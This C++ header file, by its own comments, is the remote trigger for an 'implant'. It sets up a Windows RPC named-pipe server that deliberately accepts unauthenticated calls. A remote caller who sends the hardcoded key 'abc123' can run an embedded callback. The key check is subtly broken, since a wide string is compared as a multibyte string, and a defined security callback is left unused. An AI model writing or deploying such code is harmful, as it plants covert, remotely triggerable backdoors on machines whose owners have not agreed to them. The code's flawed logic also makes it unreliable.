#pragma once
#include "targetver.h"
#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
#include "../RPCLibInterface/RPCLibInterface_h.h"
#include <Windows.h>
#include <cstdlib>
#include <mbstring.h>
#include <iostream>
#pragma comment(lib, "Rpcrt4.lib")

// Must be here to carry forward typedef in autogenerated file
typedef int(__stdcall *pfnTriggerCallback)(PTRIGGER_CONTEXT pContext);

// Handle to implicit RPC interface binding
// Must be here to instantiate extern in autogenerated file
handle_t hBinding;

// Trigger callback function pointer
// Must be here to instantiate extern in autogenerated file
static pfnTriggerCallback _pTriggerCallback;


/*!
*  The thread that will listen for incoming RPC calls.
*
*  @return RPC_STATUS 0 upon success.
*          RPC_STATUS error code upon failure.
*/
static DWORD WINAPI rpc_listen_proc(LPVOID)
{

	// Start to listen for remote procedure calls
	// for all registered interfaces.
	// This call will not return until
	// RpcMgmtStopServerListening is called.
	return RpcServerListen(
		1,
		RPC_C_LISTEN_MAX_CALLS_DEFAULT,
		FALSE);
}


/*!
* Listens on a dynamically generated named pipe interface 
* 
*
*  @param pTriggerCallback A pointer to the function to call on trigger
*  @param hStopEvent An event to watch for stop signals
*
*  @return ERROR_SUCCESS upon success.
*          ERROR_FUNCTION_FAILED upon failure.
*/
static int begin_listen_trigger(
	pfnTriggerCallback pTriggerCallback,
	HANDLE hStopEvent
)
{
	// return value
	RPC_STATUS dwRpcStatus = ERROR_FUNCTION_FAILED;

	// stores binding information
	RPC_BINDING_VECTOR *binding_vector;
	unsigned char * pszSecurity = nullptr;

	_pTriggerCallback = pTriggerCallback;

	// Register RPC interface (defined in IDL generated file)
	dwRpcStatus = RpcServerRegisterIfEx(
		RPCLib_v1_0_s_ifspec, // Interface to register.
		nullptr, // Use the MIDL generated entry-point vector.
		nullptr, // Use the MIDL generated entry-point vector.
		RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH, // Forces use of security callback.
		RPC_C_LISTEN_MAX_CALLS_DEFAULT, // Use default number of concurrent calls.
										// (unsigned)-1, // Infinite max size of incoming data blocks.
		nullptr); // Naive security callback.

	if (dwRpcStatus)
		return(dwRpcStatus);


	dwRpcStatus = RpcServerUseProtseq(
		RPC_WSTR(L"ncacn_np"), 
		RPC_C_PROTSEQ_MAX_REQS_DEFAULT, 
		pszSecurity
	);

	if (dwRpcStatus)
		return(dwRpcStatus);


	//get binding info for server
	dwRpcStatus = RpcServerInqBindings(&binding_vector);
	if (dwRpcStatus)
		return(dwRpcStatus);

	//register RPC endpoint with EP mapper
	dwRpcStatus = RpcEpRegister(
		RPCLib_v1_0_s_ifspec,
		binding_vector,
		nullptr,
		nullptr
	);

	if (dwRpcStatus) 
		return(dwRpcStatus);


	// Start to listen for remote procedure calls for all registered interfaces.
	// This call will not return until RpcMgmtStopServerListening is called.
	const auto hThread = CreateThread(
		nullptr, 
		0, 
		rpc_listen_proc,
		nullptr, 
		0, 
		nullptr
	);

	if (!hThread)
		return GetLastError();

	// Wait for stop events infinitely
	const auto dwStopListeningResult = WaitForSingleObject(
		hStopEvent, 
		INFINITE
	);

	// If a stop signal is received, stop the RPC server
	if (dwStopListeningResult == WAIT_OBJECT_0)
	{
		dwRpcStatus = RpcMgmtStopServerListening(hBinding);
		if (dwRpcStatus)
			return dwRpcStatus;

		return ERROR_SUCCESS;
	}

	// Something failed
	return ERROR_FUNCTION_FAILED;
}


/*!
 * (Override) Memory allocation function for RPC.
 * The runtime uses these two functions for allocating/deallocating
 * enough memory
*/
void* __RPC_USER midl_user_allocate(size_t size)
{
	return malloc(size);
}


/*!
 * (Override) Memory deallocation function for RPC.
 * The runtime uses these two functions for allocating/deallocating
 * enough memory
*/
void __RPC_USER midl_user_free(void* p)
{
	free(p);
}

/*!
 * (Override) Naive security callback.
 * Define auth information here 
*/
static RPC_STATUS CALLBACK SecurityCallback(RPC_IF_HANDLE /*hInterface*/, void* /*pBindingHandle*/)
{
	return RPC_S_OK; // Always allow anyone.
}


/*!
 * Triggers the implant, running the callback function with the context 
 * options specified if the provided key matches
 *
 *
 *  @param szKey A key used to grant access to the embedded function
 *  @param context The context information
 *
*/
void Trigger(const unsigned char *szKey, PTRIGGER_CONTEXT context)
{
	std::cout << "Received key: ";
	std::cout << szKey;
	const auto key = reinterpret_cast<const unsigned char *>(L"abc123");
	if (!_mbscmp(szKey, key))
	{
		_pTriggerCallback(context);
	}
}







